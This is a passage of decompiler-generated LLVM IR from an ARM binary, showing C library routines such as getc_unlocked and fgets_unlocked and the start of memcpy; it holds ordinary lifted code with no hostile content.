  uselistorder i32 %v0_16480, { 1, 0, 2 }
  uselistorder i32 %v1_16464.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16454, { 1, 0 }
  uselistorder i32 %v0_16418, { 1, 0, 2 }
  uselistorder i32 %v1_163fc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_163e4, { 1, 0 }
  uselistorder i32 %v0_163ac, { 1, 0, 2 }
  uselistorder i32 %v1_16390.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16380, { 1, 0 }
  uselistorder i32 %v0_1633c, { 1, 0, 2 }
  uselistorder i32 %v1_16320.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_162f8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 9, 8, 54, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 24, 25, 26, 27, 29, 28, 1, 30, 31, 32, 33, 35, 34, 0, 36, 37, 38, 39, 41, 40, 53, 42, 43, 44, 45, 47, 46, 55, 48, 49, 52, 50, 51 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 14, 3, 4, 5, 34, 35, 6, 7, 8, 9, 11, 10, 1, 12, 13, 36, 15, 16, 17, 32, 33, 18, 19, 21, 20, 0, 22, 23, 24, 25, 37, 38, 26, 27, 28, 39, 40, 29, 30, 31 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_165f4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_165cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165b4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16534, { 1, 0 }
  uselistorder label %dec_label_pc_16528, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_16518, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16500, { 1, 0 }
  uselistorder label %dec_label_pc_164bc, { 1, 0 }
  uselistorder label %dec_label_pc_164acthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16484, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1646c, { 1, 0 }
  uselistorder label %dec_label_pc_1642c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1641c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16404, { 1, 0 }
  uselistorder label %dec_label_pc_163d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_163b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16398, { 1, 0 }
  uselistorder label %dec_label_pc_16350, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16340, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16328, { 1, 0 }
  uselistorder label %dec_label_pc_162f4, { 1, 0 }
}

define i32 @function_16650(i32 %arg1) local_unnamed_addr {
dec_label_pc_16650:
  %v0_16650 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16650, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16650
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16650, %bb
  %v10_16660 = phi i32 [ %arg1, %dec_label_pc_16650 ], [ 0, %bb ]
  ret i32 %v10_16660

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16664 = load i32, i32* @r4, align 4
  store i32 %v3_16664, i32* %stack_var_-12, align 4
  %v6_16664 = load i32, i32* @r5, align 4
  %v9_16664 = load i32, i32* @lr, align 4
  %v0_16668 = load i32, i32* @r0, align 4
  %v1_16668 = add i32 %v0_16668, 16
  %v2_16668 = inttoptr i32 %v1_16668 to i32*
  %v3_16668 = load i32, i32* %v2_16668, align 4
  store i32 %v3_16668, i32* %r2.global-to-local, align 4
  %v1_1666c = add i32 %v0_16668, 24
  %v2_1666c = inttoptr i32 %v1_1666c to i32*
  %v3_1666c = load i32, i32* %v2_1666c, align 4
  %v3_16670 = icmp ult i32 %v3_16668, %v3_1666c
  store i32 %v0_16668, i32* @r4, align 4
  br i1 %v3_16670, label %bb, label %dec_label_pc_16690

bb:                                               ; preds = %entry
  %v2_1667c = inttoptr i32 %v3_16668 to i8*
  %v3_1667c = load i8, i8* %v2_1667c, align 1
  %v4_1667c = zext i8 %v3_1667c to i32
  store i32 %v4_1667c, i32* %r0.global-to-local, align 4
  %v6_1667c = add i32 %v3_16668, 1
  store i32 %v6_1667c, i32* %r2.global-to-local, align 4
  store i32 %v6_1667c, i32* %v2_16668, align 4
  br label %dec_label_pc_1677c

dec_label_pc_16690:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r5, align 4
  %v1_16690 = inttoptr i32 %v0_16668 to i16*
  %v2_16690 = load i16, i16* %v1_16690, align 2
  %v3_16690 = zext i16 %v2_16690 to i32
  %v1_16694 = and i32 %v3_16690, 131
  %tmp25 = icmp ugt i32 %v1_16694, 128
  br i1 %tmp25, label %dec_label_pc_166b0, label %dec_label_pc_166a0

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16690
  store i32 128, i32* @r1, align 4
  %v0_166a4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_166a4, i32* %r0.global-to-local, align 4
  %v2_166a8 = icmp eq i32 %v0_166a4, 0
  br i1 %v2_166a8, label %dec_label_pc_166a0.dec_label_pc_166b0_crit_edge, label %dec_label_pc_16778

dec_label_pc_166a0.dec_label_pc_166b0_crit_edge:  ; preds = %dec_label_pc_166a0
  %v0_166b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %dec_label_pc_166a0.dec_label_pc_166b0_crit_edge, %dec_label_pc_16690
  %v2_166f0 = phi i32 [ %v0_166b0.pre, %dec_label_pc_166a0.dec_label_pc_166b0_crit_edge ], [ %v0_16668, %dec_label_pc_16690 ]
  %v1_166b0 = inttoptr i32 %v2_166f0 to i16*
  %v2_166b0 = load i16, i16* %v1_166b0, align 2
  %v3_166b0 = zext i16 %v2_166b0 to i32
  store i32 %v3_166b0, i32* %r2.global-to-local, align 4
  %v1_166b4 = and i32 %v3_166b0, 2
  %v2_166b4 = icmp eq i32 %v1_166b4, 0
  br i1 %v2_166b4, label %dec_label_pc_166e0, label %dec_label_pc_166bc

dec_label_pc_166bc:                               ; preds = %dec_label_pc_166b0
  %tmp26 = urem i16 %v2_166b0, 2
  %v1_166bc = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_166bc
  %v4_166c0 = and i32 %tmp22, 4
  %v5_166c0 = add i32 %v4_166c0, %v2_166f0
  %v1_166c4 = add i32 %v5_166c0, 36
  %v2_166c4 = inttoptr i32 %v1_166c4 to i8*
  %v3_166c4 = load i8, i8* %v2_166c4, align 1
  %v4_166c4 = zext i8 %v3_166c4 to i32
  %v1_166c8 = add nsw i32 %v3_166b0, -1
  store i32 %v1_166c8, i32* %r2.global-to-local, align 4
  store i32 %v4_166c4, i32* %r0.global-to-local, align 4
  %v2_166d4 = add i32 %v2_166f0, 40
  %v3_166d4 = inttoptr i32 %v2_166d4 to i32*
  store i32 0, i32* %v3_166d4, align 4
  %v0_166d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_166d8 = trunc i32 %v0_166d8 to i16
  %v2_166d8 = load i32, i32* @r4, align 4
  %v3_166d8 = inttoptr i32 %v2_166d8 to i16*
  store i16 %v1_166d8, i16* %v3_166d8, align 2
  br label %dec_label_pc_1677c

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166b0
  %v1_166e0 = add i32 %v2_166f0, 16
  %v1_166e4 = inttoptr i32 %v1_166e0 to i32*
  %v2_166e4 = load i32, i32* %v1_166e4, align 4
  store i32 %v2_166e4, i32* @r1, align 4
  %v3_166e4 = add i32 %v2_166f0, 20
  %v4_166e4 = inttoptr i32 %v3_166e4 to i32*
  %v5_166e4 = load i32, i32* %v4_166e4, align 4
  %v9_166e8 = icmp eq i32 %v5_166e4, %v2_166e4
  br i1 %v9_166e8, label %dec_label_pc_166f8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_166e0
  %v2_166ec = inttoptr i32 %v2_166e4 to i8*
  %v3_166ec = load i8, i8* %v2_166ec, align 1
  %v4_166ec = zext i8 %v3_166ec to i32
  store i32 %v4_166ec, i32* %r0.global-to-local, align 4
  %v6_166ec = add i32 %v2_166e4, 1
  store i32 %v6_166ec, i32* @r1, align 4
  store i32 %v6_166ec, i32* %v1_166e4, align 4
  br label %dec_label_pc_1677c

dec_label_pc_166f8:                               ; preds = %dec_label_pc_166e0
  %v1_166f8 = add i32 %v2_166f0, 4
  %v2_166f8 = inttoptr i32 %v1_166f8 to i32*
  %v3_166f8 = load i32, i32* %v2_166f8, align 4
  %v7_166fc = icmp eq i32 %v3_166f8, -2
  br i1 %v7_166fc, label %.thread7, label %dec_label_pc_16710

.thread7:                                         ; preds = %dec_label_pc_166f8
  %v2_16700 = or i16 %v2_166b0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16700, i16* %v1_166b0, align 2
  br label %dec_label_pc_1677c

dec_label_pc_16710:                               ; preds = %dec_label_pc_166f8
  %v1_16710 = and i32 %v3_166b0, 768
  %v2_16710 = icmp eq i32 %v1_16710, 0
  br i1 %v2_16710, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16710
  %v1_16718 = load i32, i32* @r5, align 4
  %v3_16718 = add i32 %v1_16718, 76
  %v4_16718 = inttoptr i32 %v3_16718 to i32*
  %v5_16718 = load i32, i32* %v4_16718, align 4
  store i32 %v5_16718, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16710, %bb23
  store i32 91936, i32* @lr, align 4
  %v1_1671c = xor i1 %v2_16710, true
  call void @__pseudo_cond_branch(i1 %v1_1671c, i32 ptrtoint (i32* @global_var_162b8.597 to i32))
  %v0_16720 = load i32, i32* @r4, align 4
  %v1_16720 = add i32 %v0_16720, 8
  store i32 %v1_16720, i32* %r2.global-to-local, align 4
  %v1_16724 = inttoptr i32 %v1_16720 to i32*
  %v2_16724 = load i32, i32* %v1_16724, align 4
  store i32 %v2_16724, i32* %r2.global-to-local, align 4
  %v3_16724 = add i32 %v0_16720, 12
  %v4_16724 = inttoptr i32 %v3_16724 to i32*
  %v5_16724 = load i32, i32* %v4_16724, align 4
  %v9_16728 = icmp eq i32 %v5_16724, %v2_16724
  br i1 %v9_16728, label %dec_label_pc_1675c, label %dec_label_pc_16730

dec_label_pc_16730:                               ; preds = %.thread9
  %v2_16730 = add i32 %v0_16720, 24
  %v3_16730 = inttoptr i32 %v2_16730 to i32*
  store i32 %v2_16724, i32* %v3_16730, align 4
  %v0_16734 = load i32, i32* @r4, align 4
  store i32 %v0_16734, i32* %r0.global-to-local, align 4
  %v2_16738 = call i32 @__stdio_rfill(i32 %v0_16734)
  store i32 %v2_16738, i32* %r0.global-to-local, align 4
  %v2_1673c = icmp eq i32 %v2_16738, 0
  br i1 %v2_1673c, label %dec_label_pc_16778, label %dec_label_pc_16744

dec_label_pc_16744:                               ; preds = %dec_label_pc_16730
  %v0_16744 = load i32, i32* @r4, align 4
  %v1_16744 = add i32 %v0_16744, 20
  %v2_16744 = inttoptr i32 %v1_16744 to i32*
  %v3_16744 = load i32, i32* %v2_16744, align 4
  %v2_16748 = add i32 %v0_16744, 24
  %v3_16748 = inttoptr i32 %v2_16748 to i32*
  store i32 %v3_16744, i32* %v3_16748, align 4
  %v0_1674c = load i32, i32* @r4, align 4
  %v1_1674c = add i32 %v0_1674c, 16
  %v2_1674c = inttoptr i32 %v1_1674c to i32*
  %v3_1674c = load i32, i32* %v2_1674c, align 4
  %v1_16750 = inttoptr i32 %v3_1674c to i8*
  %v2_16750 = load i8, i8* %v1_16750, align 1
  %v3_16750 = zext i8 %v2_16750 to i32
  store i32 %v3_16750, i32* %r0.global-to-local, align 4
  %v5_16750 = add i32 %v3_1674c, 1
  store i32 %v5_16750, i32* %v2_1674c, align 4
  br label %dec_label_pc_1677c

dec_label_pc_1675c:                               ; preds = %.thread9
  %v1_1675c = inttoptr i32 %v0_16720 to i16*
  store i32 %v0_16720, i32* %r0.global-to-local, align 4
  %v2_16760 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_16760, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16768 = call i32 @__stdio_READ(i16* %v1_1675c, i32 %v2_16760, i32 1)
  store i32 %v5_16768, i32* %r0.global-to-local, align 4
  %v2_1676c = icmp eq i32 %v5_16768, 0
  br i1 %v2_1676c, label %dec_label_pc_16778, label %bb24

bb24:                                             ; preds = %dec_label_pc_1675c
  %v4_16770 = load i8, i8* %stack_var_-17, align 1
  %v5_16770 = sext i8 %v4_16770 to i32
  store i32 %v5_16770, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1677c

dec_label_pc_16778:                               ; preds = %dec_label_pc_1675c, %dec_label_pc_166a0, %dec_label_pc_16730
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1677c

dec_label_pc_1677c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16744, %dec_label_pc_166bc, %dec_label_pc_16778
  %v2_16780 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16780, i32* @r4, align 4
  store i32 %v6_16664, i32* @r5, align 4
  store i32 %v9_16664, i32* @lr, align 4
  %v1_16784 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16784

; uselistorder directives
  uselistorder i32 %v2_166e4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_166f0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16668, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder i16 2, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1677c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16778, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_16790 = load i32, i32* @r6, align 4
  %v12_16790 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16794 = icmp eq i32 %arg2, 0
  store i1 %v2_16794, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1681c, label %dec_label_pc_16804.preheader

dec_label_pc_16804.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_168042 = add i32 %arg2, -1
  store i32 %v1_168042, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_168048 = icmp eq i32 %arg2, 1
  store i1 %v7_168048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_168048, label %dec_label_pc_1680c, label %dec_label_pc_167b0

dec_label_pc_167b0:                               ; preds = %dec_label_pc_16804.preheader, %dec_label_pc_16804.backedge.dec_label_pc_167b0_crit_edge
  %v0_167d4 = phi i32 [ %v0_167b0.pre, %dec_label_pc_16804.backedge.dec_label_pc_167b0_crit_edge ], [ %arg3, %dec_label_pc_16804.preheader ]
  %v1_167b0 = add i32 %v0_167d4, 16
  %v2_167b0 = inttoptr i32 %v1_167b0 to i32*
  %v3_167b0 = load i32, i32* %v2_167b0, align 4
  store i32 %v3_167b0, i32* %r2.global-to-local, align 4
  %v1_167b4 = add i32 %v0_167d4, 24
  %v2_167b4 = inttoptr i32 %v1_167b4 to i32*
  %v3_167b4 = load i32, i32* %v2_167b4, align 4
  store i32 %v3_167b4, i32* %r3.global-to-local, align 4
  %v3_167b8 = icmp uge i32 %v3_167b0, %v3_167b4
  store i1 %v3_167b8, i1* %cpsr_c.global-to-local, align 1
  %v9_167b8 = icmp eq i32 %v3_167b0, %v3_167b4
  store i1 %v9_167b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_167b8, label %dec_label_pc_167d4, label %dec_label_pc_167c0

dec_label_pc_167c0:                               ; preds = %dec_label_pc_167b0
  %v1_167c0 = inttoptr i32 %v3_167b0 to i8*
  %v2_167c0 = load i8, i8* %v1_167c0, align 1
  %v3_167c0 = zext i8 %v2_167c0 to i32
  store i32 %v3_167c0, i32* %r3.global-to-local, align 4
  %v5_167c0 = add i32 %v3_167b0, 1
  store i32 %v5_167c0, i32* %r2.global-to-local, align 4
  %v2_167c4 = load i32, i32* @r5, align 4
  %v3_167c4 = inttoptr i32 %v2_167c4 to i8*
  store i8 %v2_167c0, i8* %v3_167c4, align 1
  %v4_167c4 = load i32, i32* @r5, align 4
  %v5_167c4 = add i32 %v4_167c4, 1
  store i32 %v5_167c4, i32* @r5, align 4
  %v0_167c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_167c8 = icmp ugt i32 %v0_167c8, 9
  store i1 %v2_167c8, i1* %cpsr_c.global-to-local, align 1
  %v7_167c8 = icmp eq i32 %v0_167c8, 10
  store i1 %v7_167c8, i1* %cpsr_z.global-to-local, align 1
  %v0_167cc = load i32, i32* %r2.global-to-local, align 4
  %v1_167cc = load i32, i32* @r4, align 4
  %v2_167cc = add i32 %v1_167cc, 16
  %v3_167cc = inttoptr i32 %v2_167cc to i32*
  store i32 %v0_167cc, i32* %v3_167cc, align 4
  br i1 %v7_167c8, label %dec_label_pc_1680c, label %dec_label_pc_16804.backedge

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167b0
  %v1_167d4 = inttoptr i32 %v0_167d4 to i16*
  %v3_167d8 = call i32 @getc_unlocked(i16* %v1_167d4)
  %v3_167dc = icmp eq i32 %v3_167d8, -1
  store i1 %v3_167dc, i1* %cpsr_c.global-to-local, align 1
  %v8_167dc = icmp eq i32 %v3_167d8, -1
  store i1 %v8_167dc, i1* %cpsr_z.global-to-local, align 1
  %v1_167e0 = urem i32 %v3_167d8, 256
  store i32 %v1_167e0, i32* %r3.global-to-local, align 4
  br i1 %v3_167dc, label %dec_label_pc_167e8, label %dec_label_pc_16800

dec_label_pc_167e8:                               ; preds = %dec_label_pc_167d4
  %v0_167e8 = load i32, i32* @r4, align 4
  %v1_167e8 = inttoptr i32 %v0_167e8 to i16*
  %v2_167e8 = load i16, i16* %v1_167e8, align 2
  %v3_167e8 = zext i16 %v2_167e8 to i32
  store i32 %v3_167e8, i32* %r3.global-to-local, align 4
  %v1_167ec = and i32 %v3_167e8, 8
  %v2_167ec = icmp eq i32 %v1_167ec, 0
  store i1 %v2_167ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_167ec, label %dec_label_pc_1680c, label %dec_label_pc_1681c

dec_label_pc_16800:                               ; preds = %dec_label_pc_167d4
  %v1_167f8 = trunc i32 %v3_167d8 to i8
  %v2_167f8 = load i32, i32* @r5, align 4
  %v3_167f8 = inttoptr i32 %v2_167f8 to i8*
  store i8 %v1_167f8, i8* %v3_167f8, align 1
  %v4_167f8 = load i32, i32* @r5, align 4
  %v5_167f8 = add i32 %v4_167f8, 1
  store i32 %v5_167f8, i32* @r5, align 4
  %v0_167fc = load i32, i32* %r3.global-to-local, align 4
  %v2_167fc = icmp ugt i32 %v0_167fc, 9
  store i1 %v2_167fc, i1* %cpsr_c.global-to-local, align 1
  %v7_167fc = icmp eq i32 %v0_167fc, 10
  store i1 %v7_167fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_167fc, label %dec_label_pc_1680c, label %dec_label_pc_16804.backedge

dec_label_pc_16804.backedge:                      ; preds = %dec_label_pc_16800, %dec_label_pc_167c0
  %v0_16804 = load i32, i32* @r6, align 4
  %v1_16804 = add i32 %v0_16804, -1
  store i32 %v1_16804, i32* @r6, align 4
  %v2_16804 = icmp ne i32 %v0_16804, 0
  store i1 %v2_16804, i1* %cpsr_c.global-to-local, align 1
  %v7_16804 = icmp eq i32 %v0_16804, 1
  store i1 %v7_16804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16804, label %dec_label_pc_1680c, label %dec_label_pc_16804.backedge.dec_label_pc_167b0_crit_edge

dec_label_pc_16804.backedge.dec_label_pc_167b0_crit_edge: ; preds = %dec_label_pc_16804.backedge
  %v0_167b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_167b0

dec_label_pc_1680c:                               ; preds = %dec_label_pc_16800, %dec_label_pc_16804.backedge, %dec_label_pc_167c0, %dec_label_pc_16804.preheader, %dec_label_pc_167e8
  %v0_1680c = load i32, i32* @r5, align 4
  %v1_1680c = load i32, i32* @r7, align 4
  %v3_1680c = icmp uge i32 %v0_1680c, %v1_1680c
  store i1 %v3_1680c, i1* %cpsr_c.global-to-local, align 1
  %v9_1680c = icmp eq i32 %v0_1680c, %v1_1680c
  store i1 %v9_1680c, i1* %cpsr_z.global-to-local, align 1
  %v2_16810 = xor i1 %v9_1680c, true
  %v3_16810 = and i1 %v3_1680c, %v2_16810
  br i1 %v3_16810, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1680c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16814 = inttoptr i32 %v0_1680c to i8*
  store i8 0, i8* %v7_16814, align 1
  %v0_16818.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_16818.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1680c, %bb
  %v1_16818 = phi i1 [ %v1_16818.pre, %bb ], [ %v9_1680c, %dec_label_pc_1680c ]
  %v0_16818 = phi i1 [ %v0_16818.pre, %bb ], [ %v3_1680c, %dec_label_pc_1680c ]
  %v2_16818 = xor i1 %v1_16818, true
  %v3_16818 = and i1 %v0_16818, %v2_16818
  br i1 %v3_16818, label %.dec_label_pc_16820_crit_edge, label %dec_label_pc_1681c

.dec_label_pc_16820_crit_edge:                    ; preds = %.thread14
  %v0_16820.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16820

dec_label_pc_1681c:                               ; preds = %entry, %dec_label_pc_167e8, %.thread14
  br label %dec_label_pc_16820

dec_label_pc_16820:                               ; preds = %.dec_label_pc_16820_crit_edge, %dec_label_pc_1681c
  %v0_16820 = phi i32 [ %v0_16820.pre, %.dec_label_pc_16820_crit_edge ], [ 0, %dec_label_pc_1681c ]
  store i32 %v9_16790, i32* @r6, align 4
  store i32 %v12_16790, i32* @r7, align 4
  ret i32 %v0_16820

; uselistorder directives
  uselistorder i1 %v9_1680c, { 1, 0, 2 }
  uselistorder i32 %v1_1680c, { 1, 0 }
  uselistorder i32 %v0_1680c, { 0, 2, 1 }
  uselistorder i32 %v0_16804, { 2, 0, 1 }
  uselistorder i32 %v0_167fc, { 1, 0 }
  uselistorder i32 %v3_167d8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_167c8, { 1, 0 }
  uselistorder i32 %v3_167b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_167d4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16820, { 1, 0 }
  uselistorder label %dec_label_pc_1681c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1680c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_167b0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16830 = load i32, i32* @r1, align 4
  %v1_16830 = load i32, i32* @r0, align 4
  %v2_16830 = sub i32 %v0_16830, %v1_16830
  %v3_16830 = icmp ult i32 %v0_16830, %v1_16830
  %v4_16830 = xor i32 %v1_16830, %v0_16830
  %v5_16830 = xor i32 %v2_16830, %v0_16830
  %v6_16830 = and i32 %v5_16830, %v4_16830
  %v7_16830 = icmp slt i32 %v6_16830, 0
  store i1 %v7_16830, i1* %cpsr_v.global-to-local, align 1
  %v8_16830 = icmp slt i32 %v2_16830, 0
  store i1 %v8_16830, i1* %cpsr_n.global-to-local, align 1
  %v9_16830 = icmp eq i32 %v0_16830, %v1_16830
  store i1 %v9_16830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16830, label %dec_label_pc_16a84, label %dec_label_pc_16838

dec_label_pc_16838:                               ; preds = %entry
  br i1 %v9_16830, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_16838
  %merge = phi i32 [ %v0_16830, %dec_label_pc_16838 ], [ %v2_16b18, %bb150 ], [ %v11_16b34, %bb153 ], [ %v7_16b34, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16838
  %v5_1683c = inttoptr i32 %v1_16830 to i8*
  store i8* %v5_1683c, i8** %stack_var_-8, align 4
  %v8_1683c = load i32, i32* @lr, align 4
  %v0_16840 = load i32, i32* @r2, align 4
  %v2_16840 = add i32 %v0_16840, -4
  store i32 %v2_16840, i32* %r2.global-to-local, align 4
  %v4_16840 = sub i32 3, %v0_16840
  %v5_16840 = and i32 %v4_16840, %v0_16840
  %v6_16840 = icmp slt i32 %v5_16840, 0
  store i1 %v6_16840, i1* %cpsr_v.global-to-local, align 1
  %v7_16840 = icmp slt i32 %v2_16840, 0
  store i1 %v7_16840, i1* %cpsr_n.global-to-local, align 1
  %v8_16840 = icmp eq i32 %v0_16840, 4
  store i1 %v8_16840, i1* %cpsr_z.global-to-local, align 1
  %v5_16844 = icmp slt i32 %v0_16840, 4
  br i1 %v5_16844, label %bb140, label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %bb
  %v1_16848 = urem i32 %v1_16830, 4
  store i32 %v1_16848, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16848 = icmp eq i32 %v1_16848, 0
  store i1 %v2_16848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16848, label %dec_label_pc_16850, label %dec_label_pc_168fc

dec_label_pc_16850:                               ; preds = %dec_label_pc_16848
  %v1_16850 = urem i32 %v0_16830, 4
  store i32 %v1_16850, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16850 = icmp eq i32 %v1_16850, 0
  store i1 %v2_16850, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16830 to i2
  br i1 %v2_16850, label %dec_label_pc_16858, label %dec_label_pc_1692c

dec_label_pc_16858:                               ; preds = %dec_label_pc_16850, %dec_label_pc_16924
